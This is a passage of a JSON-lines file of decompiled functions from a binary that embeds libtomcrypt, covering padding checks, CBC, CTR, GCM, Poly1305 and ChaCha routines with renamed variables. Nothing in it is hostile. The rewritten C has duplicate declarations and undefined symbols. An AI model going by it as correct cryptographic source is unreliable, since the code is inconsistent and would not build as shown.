}\n    }\n    \n    FUN_0041aff0(*(undefined8 *)(param_3 + 4), *(undefined8 *)(param_3 + 2),\n                  *(undefined8 *)(param_3 + 6), *(undefined8 *)(param_3 + 0x10),\n                  *(undefined8 *)(param_3 + 0xe), *(undefined8 *)(param_3 + 0xc),\n                  *(undefined8 *)(param_3 + 8), *(undefined8 *)(param_3 + 10), 0);\n    return returnStatus; \n}"}
{"Function Name": "FUN_0041f620", "Address": "0041f620", "Source Code": "void FUN_0041f620(void) \n{\n    (*functionPointer)(); \n}"}
{"Function Name": "FUN_0041f630", "Address": "0041f630", "Source Code": "undefined8\nFUN_0041f630(char *input_string, ulong max_elements, int comparison_char, ulong element_count, void *destination_buffer, ulong *available_space, undefined4 *status_code)\n{\n    undefined8 return_value; \n    char third_char; \n    ulong current_index; \n    ulong remaining_elements; \n    ulong total_elements = (element_count >> 3) + (ulong)((element_count & 7) != 0); \n    \n    *status_code = 0; \n    if ((total_elements < 0xb) || (total_elements < max_elements)) { \n        return 0x16; \n    }\n    \n    return_value = 7; \n    if ((*input_string == '\\0') && (input_string[1] == (char)comparison_char)) { \n        if (comparison_char == 2) { \n            remaining_elements = 2; \n            while (remaining_elements < total_elements && input_string[remaining_elements] != '\\0') { \n                remaining_elements++; \n            }\n            current_index = remaining_elements - 2; \n            if ((current_index < 8) || (total_elements <= remaining_elements + 1)) { \n                return 7; \n            }\n        }\n    } else {\n        if ((total_elements - 1 < 3) || (input_string[2] != -1)) { \n            third_char = input_string[2]; \n            current_index = 2; \n        } else {\n            current_index = 2; \n            while (current_index < total_elements - 1 && (third_char = input_string[current_index]) == -1) { \n                current_index++; \n            }\n        }\n        if (third_char != '\\0') { \n            return 7; \n        }\n        current_index -= 2; \n    }\n    \n    remaining_elements = (max_elements - 3) - current_index; \n    if (*available_space < remaining_elements) { \n        return 6; \n    }\n    \n    memcpy(destination_buffer, input_string + current_index + 3, remaining_elements); \n    *available_space = remaining_elements; \n    *status_code = 1; \n    return 0; \n}"}
{"Function Name": "FUN_0041f740", "Address": "0041f740", "Source Code": "undefined8\nFUN_0041f740(undefined8 input1, undefined8 input2, int count, undefined8 input4, undefined8 input5, uint threshold)\n{\n    \n    if (1 < count - 1U) {\n        \n        return 0x18;\n    }\n    \n    \n    if (count == 2 && (0xff < threshold || (&DAT_006495c0)[(long)(int)threshold * 10] == 0)) {\n        \n        return 0xc;\n    }\n    \n    \n    return FUN_00405aa0();\n}"}
{"Function Name": "FUN_0041fe30", "Address": "0041fe30", "Source Code": "undefined8 FUN_0041fe30(uint input_value, uint index, long prng_pointer, undefined8 context)\n{\n    undefined8 return_value; \n    long unused_variable; \n    long calculated_length; \n    undefined local_buffer[256]; \n    \n    if (prng_pointer == 0) {\n        FUN_00410bc0(\"prng != NULL\", \"libtomcrypt.c\", 0x6ecc); \n    }\n    return_value = 0xc; \n    \n    if ((index < 0x100) && ((&data_array)[index * 10] != 0)) {\n        return_value = 8; \n        \n        if (input_value - 0x40 < 0x3c1) {\n            \n            return_value = (*(code *)(&function_array)[index * 10])(prng_pointer);\n            \n            if ((int)return_value == 0) {\n                \n                calculated_length = (long)((((int)input_value >> 3) + (uint)((input_value & 7) != 0)) * 2);\n                \n                if (calculated_length == FUN_0041fd30(local_buffer, calculated_length, context)) {\n                    \n                    return_value = (*(code *)(&function_array_2)[index * 10])(local_buffer, calculated_length, prng_pointer);\n                    \n                    if ((int)return_value == 0) {\n                        \n                        return_value = (*(code *)(&function_array_3)[index * 10])(prng_pointer);\n                    }\n                }\n            }\n        }\n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00420450", "Address": "00420450", "Source Code": "void FUN_00420450(long input_param)\n{\n    \n    if (input_param == 0) {\n        \n        log_error(\"key != ((void *)0)\",\"libtomcrypt.c\",0x705f);\n    }\n    \n    call_function(\n        *(undefined8 *)(input_param + 8),   \n        *(undefined8 *)(input_param + 0x10), \n        *(undefined8 *)(input_param + 0x18), \n        *(undefined8 *)(input_param + 0x40), \n        *(undefined8 *)(input_param + 0x38), \n        *(undefined8 *)(input_param + 0x30), \n        *(undefined8 *)(input_param + 0x20), \n        *(undefined8 *)(input_param + 0x28), \n        0                               \n    );\n}"}
{"Function Name": "FUN_004204c0", "Address": "004204c0", "Source Code": "void FUN_004204c0(long inputPointer, undefined8 context, long keyPointer)\n{\n    \n    if (inputPointer == 0) {\n        \n        FUN_00410bc0(\"in != NULL\", \"libtomcrypt.c\", 0x708b);\n    }\n    \n    \n    if (keyPointer == 0) {\n        \n        FUN_00410bc0(\"key != NULL\", \"libtomcrypt.c\", 0x708c);\n    }\n    \n    \n    if (globalVariable == 0) {\n        \n        FUN_00410bc0(\"ltc_mp.name != NULL\", \"libtomcrypt.c\", 0x708d);\n    }\n    \n    \n    if (FUN_0041ae70(keyPointer + 8, keyPointer + 0x10, keyPointer + 0x18, keyPointer + 0x40, keyPointer + 0x38,\n                     keyPointer + 0x30, keyPointer + 0x20, keyPointer + 0x28, 0) != 0) {\n        \n        return;\n    }\n    \n    \n    FUN_0041e650(inputPointer, context, keyPointer);\n}"}
{"Function Name": "FUN_00421190", "Address": "00421190", "Source Code": "undefined8 FUN_00421190(undefined8 input_value, ulong threshold, long offset)\n{\n    \n    ulong computed_value = (*function_pointer_1)();\n    \n    \n    if (threshold < computed_value) {\n        \n        return 6;\n    }\n    \n    \n    FUN_004205c0(offset, threshold);\n    \n    \n    return (*function_pointer_2)(input_value, offset + (threshold - computed_value));\n}"}
{"Function Name": "FUN_00422d30", "Address": "00422d30", "Source Code": "undefined8 FUN_00422d30(long input_value) \n{\n    undefined4 hash_algorithm_id; \n    undefined hash_buffer[560]; \n    hash_algorithm_id = FUN_00414210(\"sha256\"); \n    FUN_004227f0(hash_buffer, hash_algorithm_id, &hash_key, 0x20); \n    FUN_00422a50(hash_buffer, input_value, 0x20); \n    FUN_00422af0(hash_buffer, *(undefined8 *)(input_value + 0x223d0), (undefined8[]){0x20}); \n    return 1; \n}"}
{"Function Name": "FUN_00422f90", "Address": "00422f90", "Source Code": "undefined8 FUN_00422f90(uint *input_param)\n{\n    \n    if (input_param == (uint *)0x0) {\n        \n        FUN_00410bc0(\"cbc != NULL\",\"libtomcrypt.c\",0x803f);\n    }\n    \n    \n    \n    if (*input_param < 0x100 && (&data_array)[(long)(int)*input_param * 0x16] != 0) {\n        \n        \n        (**(code **)(&function_pointer_array + (long)(int)*input_param * 0xb0))(input_param + 0x22);\n        return 0; \n    }\n    \n    return 10; \n}"}
{"Function Name": "FUN_00423460", "Address": "00423460", "Source Code": "void FUN_00423460(long input_value, ulong *data_pointer)\n{\n    \n    ulong *calculated_pointer = (ulong *)(((ulong)*(byte *)data_pointer + 0x111) * 0x10 + input_value);\n    \n    \n    ulong second_value = calculated_pointer[1];\n    \n    \n    ulong first_value = *calculated_pointer;\n    \n    \n    for (int iteration_index = 0; iteration_index < 15; iteration_index++) {\n        \n        ulong offset_value = (ulong)*(byte *)((long)data_pointer + iteration_index + 1) + (iteration_index + 1) * 0x100;\n        \n        \n        second_value ^= *(ulong *)(input_value + 0x1118 + offset_value * 0x10);\n        \n        \n        first_value ^= *(ulong *)(input_value + (offset_value + 0x111) * 0x10);\n    }\n    \n    \n    *data_pointer = first_value;\n    \n    \n    data_pointer[1] = second_value;\n}"}
{"Function Name": "FUN_00423de0", "Address": "00423de0", "Source Code": "void FUN_00423de0(ulong *param_1, ulong *param_2, long param_3)\n{\n    ulong intermediateValue1, intermediateValue2, processedValue1, inputValue1, intermediateValue3; \n    long loopIndex1, innerLoopIndex, calculatedIndex2, outerLoopIndex2; \n    int loopCounter = 0; \n    ulong intermediateResults[5]; \n    ulong processedData[25]; \n    ulong additionalProcessing[23]; \n    \n    FUN_004205c0(processedData, 0x18);\n    \n    FUN_004205c0(processedData + 0x18, 0x18);\n    \n    inputValue1 = *param_1;\n    \n    processedValue1 = (inputValue1 >> 0x38) | ((inputValue1 & 0xff000000000000) >> 0x28) | ((inputValue1 & 0xff0000000000) >> 0x18) |\n            ((inputValue1 & 0xff00000000) >> 8) | ((inputValue1 & 0xff000000) << 8) | ((inputValue1 & 0xff0000) << 0x18) |\n            ((inputValue1 & 0xff00) << 0x28) | (inputValue1 << 0x38);\n    processedData[0x18] = processedValue1; \n    intermediateResults[0] = *param_2; \n    \n    inputValue1 = param_1[1];\n    intermediateValue2 = (inputValue1 >> 0x38); \n    \n    additionalProcessing[0] = intermediateValue2 | ((inputValue1 & 0xff000000000000) >> 0x28) | ((inputValue1 & 0xff0000000000) >> 0x18) |\n            ((inputValue1 & 0xff00000000) >> 8) | ((inputValue1 & 0xff000000) << 8) |\n            ((inputValue1 & 0xff0000) << 0x18) | ((inputValue1 & 0xff00) << 0x28) | (inputValue1 << 0x38);\n    intermediateResults[1] = param_2[1]; \n    \n    processedData[0xc] = processedValue1 >> 1;\n    processedData[6] = processedValue1 >> 2;\n    processedData[3] = processedValue1 >> 3;\n    processedData[0xd] = (processedValue1 >> 1) | (additionalProcessing[0] >> 1);\n    processedData[7] = (processedValue1 >> 2) | (additionalProcessing[0] >> 2);\n    processedData[4] = (processedValue1 >> 3) | (additionalProcessing[0] >> 3);\n    processedData[0xe] = (intermediateValue2 << 0x3f) | (additionalProcessing[1] >> 1);\n    processedData[5] = (intermediateValue2 << 0x3d) | (additionalProcessing[1] >> 3);\n    processedData[8] = (intermediateValue2 << 0x3e) | (additionalProcessing[1] >> 2);\n    ulong *dataPointer = processedData; \n    while (loopCounter < 3) { \n        inputValue1 = dataPointer[6]; \n        intermediateValue1 = dataPointer[0xc]; \n        intermediateValue3 = intermediateValue1 ^ processedValue1; \n        dataPointer[0x1e] = inputValue1 ^ processedValue1; \n        intermediateValue2 = dataPointer[3]; \n        dataPointer[0x24] = intermediateValue3; \n        dataPointer[0xf] = intermediateValue1 ^ intermediateValue2; \n        dataPointer[0x2a] = inputValue1 ^ intermediateValue3; \n        dataPointer[0x1b] = intermediateValue2 ^ processedValue1; \n        dataPointer[9] = intermediateValue2 ^ inputValue1; \n        dataPointer[0x27] = intermediateValue3 ^ intermediateValue2; \n        dataPointer[0x21] = processedValue1 ^ intermediateValue2 ^ inputValue1; \n        dataPointer[0x15] = inputValue1 ^ intermediateValue1 ^ intermediateValue2; \n        dataPointer[0x2d] = inputValue1 ^ intermediateValue3 ^ intermediateValue2; \n        dataPointer++; \n        loopCounter++; \n    }\n    \n    FUN_004205c0(intermediateResults + 2, 0x20);\n    uint loopCounter2 = 0xf; \n    do {\n        for (outerLoopIndex2 = 0; outerLoopIndex2 < 2; outerLoopIndex2++) { \n            for (innerLoopIndex = 0; innerLoopIndex < 3; innerLoopIndex++) { \n                calculatedIndex2 = (long)(innerLoopIndex + outerLoopIndex2); \n                loopIndex1 = (ulong)((uint)(intermediateResults[outerLoopIndex2] >> ((byte)((loopCounter2 ^ 1) << 2) & 0x3f)) & 0xf) * 3 + innerLoopIndex);\n                intermediateResults[calculatedIndex2 + 2] ^= processedData[loopIndex1]; \n            }\n        }\n        if (loopCounter2 == 0) break; \n        inputValue1 = 0; \n        ulong *puVar7 = intermediateResults + 2; \n        do {\n            processedValue1 = *puVar7 >> 4 | inputValue1; \n            inputValue1 = *puVar7 << 0x3c; \n            *puVar7 = processedValue1; \n            puVar7++; \n        } while (puVar7 != &local_1b8); \n        loopCounter2--; \n    } while (loopCounter2 != 0xffffffff); \n    \n    for (outerLoopIndex2 = 0; outerLoopIndex2 < 4; outerLoopIndex2++) {\n        *(ulong *)((long)&local_1b8 + (long)(outerLoopIndex2 * 8)) =\n            intermediateResults[outerLoopIndex2 + 2] >> 0x38 | (intermediateResults[outerLoopIndex2 + 2] & 0xff000000000000) >> 0x28 |\n            (intermediateResults[outerLoopIndex2 + 2] & 0xff0000000000) >> 0x18 | (intermediateResults[outerLoopIndex2 + 2] & 0xff00000000) >> 8 |\n            (intermediateResults[outerLoopIndex2 + 2] & 0xff000000) << 8 | (intermediateResults[outerLoopIndex2 + 2] & 0xff0000) << 0x18 |\n            (intermediateResults[outerLoopIndex2 + 2] & 0xff00) << 0x28 | intermediateResults[outerLoopIndex2 + 2] << 0x38; \n    }\n    byte *bytePointer = &local_1a9; \n    do {\n        byte xorValue = (&DAT_00438d80)[(uint)bytePointer[0x10] * 2 + 1]; \n        *bytePointer ^= (&DAT_00438d80)[(uint)bytePointer[0x10] * 2]; \n        bytePointer[1] ^= xorValue; \n        bytePointer--; \n    } while (bytePointer != &local_1b9); \n    \n    for (outerLoopIndex2 = 0; outerLoopIndex2 < 0x10; outerLoopIndex2++) {\n        *(undefined *)(param_3 + outerLoopIndex2) = *(undefined *)((long)&local_1b8 + outerLoopIndex2); \n    }\n}"}
{"Function Name": "FUN_004246b0", "Address": "004246b0", "Source Code": "undefined8 FUN_004246b0(long input_param)\n{\n    \n    if (input_param == 0) {\n        \n        log_error(\"gcm != NULL\",\"libtomcrypt.c\",0x84c2);\n    }\n    \n    \n    initialize_memory(input_param + 0x10e0, 0x10);\n    \n    \n    initialize_memory(input_param + 0x10b0, 0x10);\n    \n    \n    *(undefined4 *)(input_param + 0x10f8) = 0;\n    \n    \n    *(undefined4 *)(input_param + 0x10f4) = 0;\n    \n    \n    *(undefined4 *)(input_param + 0x10fc) = 0;\n    \n    \n    *(undefined8 *)(input_param + 0x1100) = 0;\n    \n    \n    *(undefined8 *)(input_param + 0x1108) = 0;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_004249f0", "Address": "004249f0", "Source Code": "undefined8 FUN_004249f0(uint *input_param)\n{\n    \n    if (input_param == (uint *)0x0) {\n        \n        log_error(\"ctr != NULL\",\"libtomcrypt.c\",0x86cd);\n    }\n    \n    \n    \n    if (*input_param < 0x100 && (&data_array)[(long)(int)(*input_param) * 0x16] != 0) {\n        \n        \n        (**(code **)(&function_pointer_array + (long)(int)(*input_param) * 0xb0))(input_param + 0x46);\n        return 0; \n    }\n    \n    return 10; \n}"}
{"Function Name": "FUN_00424a50", "Address": "00424a50", "Source Code": "void FUN_00424a50(long input_ptr, long output_ptr, undefined8 data, long counter)\n{\n    \n    if (output_ptr == 0) {\n        FUN_00410bc0(\"pt != NULL\", \"libtomcrypt.c\", 0x86fa);\n    }\n    \n    if (input_ptr == 0) {\n        FUN_00410bc0(\"ct != NULL\", \"libtomcrypt.c\", 0x86fb);\n    }\n    \n    if (counter == 0) {\n        FUN_00410bc0(\"ctr != NULL\", \"libtomcrypt.c\", 0x86fc);\n    }\n    \n    FUN_00424730(input_ptr, output_ptr, data, counter);\n}"}
{"Function Name": "FUN_00424f20", "Address": "00424f20", "Source Code": "void FUN_00424f20(ulong *output_values, byte *input_bytes)\n{\n    \n    *output_values = (ulong)((uint)input_bytes[1] << 8 | (uint)input_bytes[2] << 0x10 | (uint)*input_bytes |\n                       (input_bytes[3] & 3) << 0x18);\n    \n    \n    output_values[1] = (ulong)((uint)(((ulong)input_bytes[4] << 8 | (ulong)input_bytes[5] << 0x10 |\n                                 (ulong)input_bytes[3] | (ulong)input_bytes[6] << 0x18) >> 2) & 0x3ffff03);\n    \n    \n    output_values[2] = (ulong)((uint)(((ulong)input_bytes[7] << 8 | (ulong)input_bytes[8] << 0x10 |\n                                 (ulong)input_bytes[6] | (ulong)input_bytes[9] << 0x18) >> 4) & 0x3ffc0ff);\n    \n    \n    output_values[3] = (ulong)((uint)(((ulong)input_bytes[10] << 8 | (ulong)input_bytes[0xb] << 0x10 |\n                                 (ulong)input_bytes[9] | (ulong)input_bytes[0xc] << 0x18) >> 6) & 0x3f03fff);\n    \n    \n    output_values[4] = (ulong)((uint)input_bytes[0xd] | (uint)(((ulong)input_bytes[0xe] << 0x10) >> 8) |\n                         (uint)(((ulong)input_bytes[0xf] << 0x18) >> 8) & 0xfffff);\n    \n    \n    output_values[5] = output_values[6] = output_values[7] = output_values[8] = output_values[9] = 0;\n    \n    \n    output_values[10] = (ulong)input_bytes[0x11] << 8 | (ulong)input_bytes[0x12] << 0x10 | (ulong)input_bytes[0x10] |\n                  (ulong)input_bytes[0x13] << 0x18;\n    \n    \n    output_values[0xb] = (ulong)input_bytes[0x15] << 8 | (ulong)input_bytes[0x16] << 0x10 | (ulong)input_bytes[0x14] |\n                   (ulong)input_bytes[0x17] << 0x18;\n    \n    \n    output_values[0xc] = (ulong)input_bytes[0x19] << 8 | (ulong)input_bytes[0x1a] << 0x10 | (ulong)input_bytes[0x18] |\n                   (ulong)input_bytes[0x1b] << 0x18;\n    \n    \n    output_values[0xd] = (ulong)input_bytes[0x1c] | (ulong)input_bytes[0x1d] << 8 | (ulong)input_bytes[0x1e] << 0x10 |\n                   (ulong)input_bytes[0x1f] << 0x18;\n    \n    \n    output_values[0xe] = 0;\n    \n    \n    *(undefined *)(output_values + 0x11) = 0;\n    \n    \n    return;\n}"}
{"Function Name": "FUN_004250f0", "Address": "004250f0", "Source Code": "void FUN_004250f0(undefined8 *inputArray, undefined *outputArray)\n{\n    long valueAtIndexE = inputArray[0xe]; \n    if (valueAtIndexE != 0) { \n        ulong incrementedValue = valueAtIndexE + 1; \n        *(undefined *)((long)inputArray + valueAtIndexE + 0x78) = 1; \n        if (incrementedValue < 0x10) { \n            do {\n                *(undefined *)((long)inputArray + incrementedValue + 0x78) = 0; \n                incrementedValue++; \n            } while (incrementedValue != 0x10); \n        }\n        *(undefined *)(inputArray + 0x11) = 1; \n        FUN_00404b80(inputArray, inputArray + 0xf, 0x10); \n    }\n    ulong incrementedValue = ((ulong)inputArray[6] >> 0x1a) + inputArray[7]; \n    ulong calculatedValue4 = (incrementedValue >> 0x1a) + inputArray[8]; \n    ulong maskedValue3 = (ulong)((uint)incrementedValue & 0x3ffffff); \n    incrementedValue = (calculatedValue4 >> 0x1a) + inputArray[9]; \n    ulong maskedValue4 = (ulong)((uint)calculatedValue4 & 0x3ffffff); \n    calculatedValue4 = (incrementedValue >> 0x1a) * 5 + inputArray[5]; \n    ulong maskedValueIncremented = (ulong)((uint)incrementedValue & 0x3ffffff); \n    uint maskedValue2 = (uint)calculatedValue4 & 0x3ffffff; \n    ulong calculatedValue13 = (calculatedValue4 >> 0x1a) + (ulong)((uint)inputArray[6] & 0x3ffffff); \n    incrementedValue = (ulong)maskedValue2 + 5; \n    ulong calculatedValue6 = (incrementedValue >> 0x1a) + calculatedValue13; \n    ulong calculatedValue7 = (calculatedValue6 >> 0x1a) + maskedValue3; \n    ulong calculatedValue8 = (calculatedValue7 >> 0x1a) + maskedValue4; \n    calculatedValue4 = (maskedValueIncremented - 0x4000000) + (calculatedValue8 >> 0x1a); \n    ulong calculatedValue5 = 0xffffffffffffffff - ((long)calculatedValue4 >> 0x3f); \n    ulong bitwiseNotValue = ~calculatedValue5; \n    calculatedValue13 = calculatedValue13 & bitwiseNotValue | ((uint)calculatedValue6 & 0x3ffffff) & calculatedValue5; \n    calculatedValue6 = maskedValue3 & bitwiseNotValue | ((uint)calculatedValue7 & 0x3ffffff) & calculatedValue5; \n    incrementedValue = (ulong)(maskedValue2 & (uint)bitwiseNotValue | (uint)incrementedValue & 0x3ffffff & (uint)calculatedValue5 | (uint)(calculatedValue13 << 0x1a)) + inputArray[10]; \n    ulong calculatedValue8 = maskedValue4 & bitwiseNotValue | ((uint)calculatedValue8 & 0x3ffffff) & calculatedValue5; \n    ulong calculatedValue7 = (ulong)((uint)(calculatedValue6 << 0x14) | (uint)(calculatedValue13 >> 6)) + inputArray[0xb] + (incrementedValue >> 0x20); \n    long lVar1 = inputArray[0xd]; \n    *outputArray = (char)incrementedValue; \n    outputArray[4] = (char)calculatedValue7; \n    calculatedValue6 = ((calculatedValue8 & 0x3ffff) << 0xe | calculatedValue6 >> 0xc) + inputArray[0xc] + (calculatedValue7 >> 0x20); \n    outputArray[8] = (char)calculatedValue6; \n    valueAtIndexE = (ulong)((uint)((bitwiseNotValue & maskedValueIncremented | calculatedValue5 & calculatedValue4) << 8) | (uint)(calculatedValue8 >> 0x12)) + lVar1 + (calculatedValue6 >> 0x20); \n    outputArray[0xc] = (char)valueAtIndexE; \n    outputArray[1] = (char)(incrementedValue >> 8); \n    outputArray[3] = (char)(incrementedValue >> 0x18); \n    outputArray[2] = (char)(incrementedValue >> 0x10); \n    outputArray[5] = (char)(calculatedValue7 >> 8); \n    outputArray[7] = (char)(calculatedValue7 >> 0x18); \n    outputArray[6] = (char)(calculatedValue7 >> 0x10); \n    outputArray[9] = (char)(calculatedValue6 >> 8); \n    outputArray[0xb] = (char)(calculatedValue6 >> 0x18); \n    outputArray[10] = (char)(calculatedValue6 >> 0x10); \n    outputArray[0xd] = (char)((ulong)valueAtIndexE >> 8); \n    outputArray[0xf] = (char)((ulong)valueAtIndexE >> 0x18); \n    outputArray[0xe] = (char)((ulong)valueAtIndexE >> 0x10); \n    for (int loopCounter = 0; loopCounter < 10; loopCounter++) { \n        inputArray[loopCounter] = 0; \n    }\n    *inputArray = 0; \n}"}
{"Function Name": "FUN_00425390", "Address": "00425390", "Source Code": "void FUN_00425390(long buffer, long source, ulong data_size)\n{\n    \n    long current_length = *(long *)(buffer + 0x70);\n    \n    \n    if (current_length != 0) {\n        \n        ulong available_space = 0x10U - current_length;\n        \n        \n        if (data_size <= available_space) {\n            available_space = data_size;\n        }\n        \n        \n        if (available_space != 0) {\n            for (ulong index = 0; index < available_space; index++) {\n                \n                *(undefined *)(buffer + current_length + 0x78 + index) = *(undefined *)(source + index);\n            }\n        }\n        \n        \n        *(ulong *)(buffer + 0x70) = current_length + available_space;\n        \n        \n        if (current_length + available_space < 0x10) {\n            return; \n        }\n        \n        \n        data_size -= available_space;\n        source += available_space;\n        \n        \n        FUN_00404b80(buffer, buffer + 0x78, 0x10);\n        \n        \n        *(ulong *)(buffer + 0x70) = 0;\n    }\n    \n    \n    if (data_size > 0xf) {\n        \n        ulong available_space = data_size & 0xfffffffffffffff0;\n        \n        \n        data_size -= available_space;\n        \n        \n        FUN_00404b80(buffer, source, available_space);\n        \n        \n        source += available_space;\n    }\n    \n    \n    if (data_size != 0) {\n        \n        current_length = *(long *)(buffer + 0x70);\n        \n        \n        for (ulong available_space = 0; available_space < data_size; available_space++) {\n            \n            *(undefined *)(buffer + current_length + 0x78 + available_space) = *(undefined *)(source + available_space);\n        }\n        \n        \n        *(ulong *)(buffer + 0x70) = current_length + data_size;\n    }\n}"}
{"Function Name": "FUN_00425480", "Address": "00425480", "Source Code": "uint FUN_00425480(long input1, long input2)\n{\n    uint result = 0; \n    for (long index = 0; index < 0x10; index++) { \n        \n        result |= ((byte *)(input2 + index))[0] ^ ((byte *)(input1 + index))[0];\n    }\n    \n    return result - 1 >> 0x1f;\n}"}
{"Function Name": "FUN_004254b0", "Address": "004254b0", "Source Code": "void FUN_004254b0(long input_param, undefined *output_param)\n{\n    \n    undefined4 intermediate_value_1, intermediate_value_2, intermediate_value_3, intermediate_value_4, intermediate_value_5, intermediate_value_6, intermediate_value_7, intermediate_value_8, intermediate_value_9, intermediate_value_10, intermediate_value_12;\n    long loop_counter; \n    uint result_value_1, result_value_2, result_value_3, result_value_4, result_value_5, result_value_6, result_value_7, result_value_8, result_value_9, result_value_10, result_value_11, result_value_12, result_value_13, result_value_14, result_value_15, result_value_16;\n    undefined8 *local_pointer; \n    uint result_array[16]; \n    undefined8 data_holder; \n    int loop_control = 10; \n    uint specific_value; \n    \n    intermediate_value_12 = *(undefined4 *)(input_param + 0x3c);\n    intermediate_value_1 = *(undefined4 *)(input_param + 0x10);\n    intermediate_value_2 = *(undefined4 *)(input_param + 0x14);\n    intermediate_value_3 = *(undefined4 *)(input_param + 0x18);\n    intermediate_value_4 = *(undefined4 *)(input_param + 0x1c);\n    intermediate_value_5 = *(undefined4 *)(input_param + 0x20);\n    intermediate_value_6 = *(undefined4 *)(input_param + 0x24);\n    intermediate_value_7 = *(undefined4 *)(input_param + 0x28);\n    intermediate_value_8 = *(undefined4 *)(input_param + 0x2c);\n    intermediate_value_9 = *(undefined4 *)(input_param + 0x34);\n    intermediate_value_10 = *(undefined4 *)(input_param + 0x38);\n    local_pointer = &data_holder; \n    \n    for (loop_counter = 0x10; loop_counter != 0; loop_counter--) {\n        *local_pointer++ = 0; \n    }\n    \n    data_holder._0_4_ = 0x61707865; \n    data_holder._4_4_ = 0x3320646e; \n    *(undefined4 *)local_pointer = 0; \n    \n    result_array[0xc] = intermediate_value_9;\n    result_array[0xb] = intermediate_value_12;\n    result_array[0xa] = intermediate_value_10;\n    result_array[0] = intermediate_value_1;\n    result_array[1] = intermediate_value_2;\n    result_array[2] = intermediate_value_3;\n    result_array[3] = intermediate_value_4;\n    result_array[4] = intermediate_value_5;\n    result_array[5] = intermediate_value_6;\n    result_array[6] = intermediate_value_7;\n    result_array[7] = intermediate_value_8;\n    \n    for (loop_counter = 0; loop_counter < 0x40; loop_counter += 4) {\n        *(undefined4 *)((long)&data_holder + loop_counter) = result_array[loop_counter / 4];\n    }\n    specific_value = result_array[0xf]; \n    \n    do {\n        \n        result_value_5 = result_array[0xc] ^ result_array[0] + result_array[4];\n        result_value_3 = result_array[0xd] ^ result_array[1] + result_array[5];\n        result_value_1 = result_array[0xe] ^ result_array[2] + result_array[6];\n        result_value_6 = result_value_5 >> 0x10 | result_value_5 << 0x10; \n        result_value_5 = result_value_3 >> 0x10 | result_value_3 << 0x10; \n        result_value_3 = result_value_1 >> 0x10 | result_value_1 << 0x10; \n        result_value_2 = result_array[8] + result_value_6; \n        result_value_4 = result_array[9] + result_value_5; \n        result_value_15 = result_array[10] + result_value_3; \n        result_value_1 = result_array[4] ^ result_value_2; \n        result_value_8 = result_array[5] ^ result_value_4; \n        result_value_10 = result_array[6] ^ result_value_15; \n        result_value_1 = result_value_1 >> 0x14 | result_value_1 << 0xc; \n        result_value_9 = result_value_8 >> 0x14 | result_value_8 << 0xc; \n        result_value_11 = result_value_10 >> 0x14 | result_value_10 << 0xc; \n        result_value_16 = result_array[0] + result_array[4] + result_value_1; \n        result_value_14 = result_array[1] + result_array[5] + result_value_9; \n        result_value_8 = result_array[2] + result_array[6] + result_value_11; \n        result_value_6 = result_value_6 ^ result_value_16; \n        result_value_5 = result_value_5 ^ result_value_14; \n        result_value_3 = result_value_3 ^ result_value_8; \n        result_value_7 = result_value_6 >> 0x18 | result_value_6 << 8; \n        result_value_10 = result_value_5 >> 0x18 | result_value_5 << 8; \n        result_value_6 = result_value_3 >> 0x18 | result_value_3 << 8; \n        result_value_2 += result_value_7; \n        result_value_4 += result_value_10; \n        result_value_1 ^= result_value_2; \n        result_value_9 ^= result_value_4; \n        result_value_9 = result_value_9 >> 0x19 | result_value_9 << 7; \n        result_value_1 = result_value_1 >> 0x19 | result_value_1 << 7; \n        result_value_15 += result_value_6; \n        result_value_16 += result_value_9; \n        result_value_11 ^= result_value_15; \n        specific_value ^= result_array[3] + result_array[7]; \n        result_value_11 = result_value_11 >> 0x19 | result_value_11 << 7; \n        result_value_3 = specific_value >> 0x10 | specific_value << 0x10; \n        result_value_14 += result_value_11; \n        result_value_13 = result_array[0xb] + result_value_3; \n        result_value_7 ^= result_value_14; \n        result_value_5 ^= result_array[7] ^ result_value_13; \n        result_value_7 = result_value_7 >> 0x10 | result_value_7 << 0x10; \n        result_value_5 = result_value_5 >> 0x14 | result_value_5 << 0xc; \n        result_value_12 = result_array[3] + result_array[7] + result_value_5; \n        result_value_3 ^= result_value_12; \n        result_value_3 = result_value_3 >> 0x18 | result_value_3 << 8; \n        result_value_13 += result_value_3; \n        result_value_3 ^= result_value_16; \n        result_value_3 = result_value_3 >> 0x10 | result_value_3 << 0x10; \n        result_value_5 ^= result_value_13; \n        result_value_13 += result_value_7; \n        result_value_15 += result_value_3; \n        result_value_11 ^= result_value_13; \n        result_value_5 = result_value_5 >> 0x19 | result_value_5 << 7; \n        result_value_9 ^= result_value_15; \n        result_value_11 = result_value_11 >> 0x14 | result_value_11 << 0xc; \n        result_value_9 = result_value_9 >> 0x14 | result_value_9 << 0xc; \n        result_array[0] = result_value_16 + result_value_9; \n        result_value_3 ^= result_array[0]; \n        specific_value = result_value_3 >> 0x18 | result_value_3 << 8; \n        result_array[10] = result_value_15 + specific_value; \n        result_value_9 ^= result_array[10]; \n        result_array[5] = result_value_9 >> 0x19 | result_value_9 << 7; \n        result_array[1] = result_value_14 + result_value_11; \n        result_value_8 += result_value_5; \n        result_value_12 += result_value_1; \n        result_value_10 ^= result_value_8; \n        result_value_7 ^= result_array[1]; \n        result_value_6 ^= result_value_12; \n        result_value_10 = result_value_10 >> 0x10 | result_value_10 << 0x10; \n        result_array[0xc] = result_value_7 >> 0x18 | result_value_7 << 8; \n        result_value_6 = result_value_6 >> 0x10 | result_value_6 << 0x10; \n        result_value_2 += result_value_10; \n        result_array[0xb] = result_value_13 + result_array[0xc]; \n        result_value_4 += result_value_6; \n        result_value_5 ^= result_value_2; \n        result_value_11 ^= result_array[0xb]; \n        result_value_1 ^= result_value_4; \n        result_value_3 = result_value_5 >> 0x14 | result_value_5 << 0xc; \n        result_array[6] = result_value_11 >> 0x19 | result_value_11 << 7; \n        result_value_1 = result_value_1 >> 0x14 | result_value_1 << 0xc; \n        result_array[2] = result_value_8 + result_value_3; \n        result_array[3] = result_value_12 + result_value_1; \n        result_value_10 ^= result_array[2]; \n        result_value_6 ^= result_array[3]; \n        result_array[0xd] = result_value_10 >> 0x18 | result_value_10 << 8; \n        result_array[0xe] = result_value_6 >> 0x18 | result_value_6 << 8; \n        result_array[8] = result_value_2 + result_array[0xd]; \n        result_array[9] = result_value_4 + result_array[0xe]; \n        result_value_3 ^= result_array[8]; \n        result_value_1 ^= result_array[9]; \n        result_array[7] = result_value_3 >> 0x19 | result_value_3 << 7; \n        result_array[4] = result_value_1 >> 0x19 | result_value_1 << 7; \n        loop_control--; \n    } while 